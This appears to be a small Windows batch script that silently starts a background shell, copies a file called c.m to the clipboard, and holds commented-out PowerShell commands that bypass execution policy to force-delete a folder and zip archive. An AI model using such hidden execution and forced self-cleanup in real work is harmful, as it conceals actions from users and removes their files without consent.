@echo off
setlocal enabledelayedexpansion

:: Run silently in background
start /b cmd /c ^
(
  :: Copy content of c.m to clipboard
  type c.m | clip
  
  :: Brief pause to ensure clipboard operation completes
  timeout /t 1 /nobreak > nul
  
  :: Move up one directory
  ::cd ..
  
  :: Use PowerShell to delete a-main and a.zip
 :: powershell -NoProfile -ExecutionPolicy Bypass -Command ^
   :: "if (Test-Path 'a-main') { Remove-Item 'a-main' -Recurse -Force }"
  
  ::powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    ::"if (Test-Path 'a.zip') { Remove-Item 'a.zip' -Force }"
)
